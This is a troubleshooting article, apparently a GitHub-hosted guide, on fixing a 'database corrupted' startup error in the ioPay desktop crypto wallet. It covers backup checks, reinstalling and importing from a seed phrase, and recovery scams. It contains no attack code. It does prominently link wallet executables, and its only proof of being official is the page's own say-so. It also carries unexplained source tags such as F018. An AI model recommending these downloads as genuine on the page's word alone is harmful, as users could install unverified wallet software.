![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# "Database Corrupted": What to Do When ioPay Will Not Start

A corrupted-database message means the **local store the app reads is unreadable** - not that your funds are gone. Funds live on the chain; the app's local database holds what the app needs to work with them (F018).

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That distinction decides the response: this is a repair-or-reinstall problem, and the only thing that makes it dangerous is doing it without a backup.

## What causes it

- **A hard shutdown** - power loss or a forced quit while the app was writing.
- **A full disk** - a partial write is indistinguishable from corruption.
- **A failed or interrupted update.**
- **A copied or restored app folder** - the classic self-inflicted case: copying an app's data directory from another machine can leave it inconsistent.

None of those touch the account. All of them can leave the local view unusable.

## The order to work in

**1. Confirm your backup exists.** Before anything else: do you have the phrase, private key or keystore (F050)? If yes, everything below is safe. If no, **stop** and treat the account as at risk - see the last section.

**2. Restart the app**, and the machine. A single bad read after a crash often clears.

**3. Check free disk space.** A disk with no room will keep failing writes and keep reporting corruption.

**4. Update to the current build** - the problems users reported were fixed in v2.0.2, 19 November 2026 (F003), and an old build can be reading a store written by a newer one.

**5. Reinstall**, if it still fails. Remove the app, install the current release, then **import** the account from your backup. This is the step that solves it, and it is safe precisely because the account is on-chain.

**6. Restore and verify.** After import, confirm both addresses and check balances and any staking positions as buckets, not balances.

## What reinstall does and does not do

**Does:** replace the broken local store, give you a working app, and leave the account untouched.

**Does not:** recover anything you never backed up. If the phrase was only in the corrupted database, reinstall removes your last copy - which is why step 1 comes first.

This is the one scenario where "reinstall" is genuinely the right answer, and also the one where it can be irreversible. Both are true at once.

## If you have no backup

Be clear-eyed about the options, because there are only three:

- **The app still opens sometimes** - if you can unlock it at all, export the key material or reveal the phrase **now**, and store it offline. That is the whole priority.
- **The app never opens** - a local store that cannot be read cannot be exported from. No repair tool is published with this build, and this page will not invent one.
- **Someone offers to recover it** - they are asking for a phrase or a payment, and there is nothing they can do that you cannot.

## Prevention

- **Back up before you update**, every time. Not because the update touches the phrase, but because "I'll do it later" is how the one unbacked copy becomes the only copy.
- **Keep free space** on the app's volume.
- **Shut down cleanly.**
- **Do not copy app data folders between machines.** Restore from the phrase instead.

## Related

- [Password and app lock](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-password-not-working.md) - the lock is not the account.
- [Recovering an account](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/recover-a-locked-iopay-wallet-account.md) - restoring balances and staking positions.
- [Restoring from a phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/restoring-iopay-wallet-from-a-seed-phrase.md) - the step that makes a reinstall safe.

## FAQ

**Why does my ioPay Wallet say the database is corrupted?**
The local store is unreadable, usually after a crash, a full disk or an interrupted update. The account itself is on-chain.

**Will reinstalling delete my funds?**
No. It deletes the local store. Your funds remain at the account, which you restore from your backup.

**Can I repair the database instead?**
No repair tool is published with this build. Restart, free space, update, then reinstall and import.

**Does this mean my wallet was hacked?**
No. Corruption is a storage failure, not a compromise. If you suspect compromise, the signs are unauthorised outgoing transactions, not a startup error.

**What if I never backed up?**
If the app still opens, export immediately. If it does not, there is no path - which is why the backup article exists.

## What the local store holds, and what it does not

The app's local database is a working store, not a vault. It holds the app's own state: account records, the secret material the app lock sits in front of (F029), cached reads of balances and history (F020), and settings.

What it does not hold is the account itself, because the account is a position on the chain. That is why a corrupted store is a repair problem rather than a loss - and why the one genuinely dangerous case is a store that contained the *only* copy of the phrase or key.

## Telling corruption from a lock problem

The two failures look similar from the outside - the app does not reach a usable screen - and they need different fixes.

**A lock problem** presents as a password, PIN or biometric prompt that rejects what you enter, usually on an app that otherwise loads.

**A storage problem** presents as an error about the database or the store, often before any prompt appears, and often after a crash, a full disk or an interrupted update.

If you are being asked for a credential, you have a lock problem ([the app lock page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-password-not-working.md)); if you are being told the store cannot be read, you have this page.

## After a successful reinstall

Reinstallation gives you a clean app, not a restored one. Expect to set the app lock again, re-add any watch-only entries, check that the tokens you expect appear in the asset view, and confirm the version you installed. Then confirm the account: both addresses, the balance, and any staking buckets - and if the buckets look absent, read them as positions rather than balances before assuming anything was lost.


---

*Startup and local-store behaviour are described from the app; version from the release; backup artifacts from F050.*
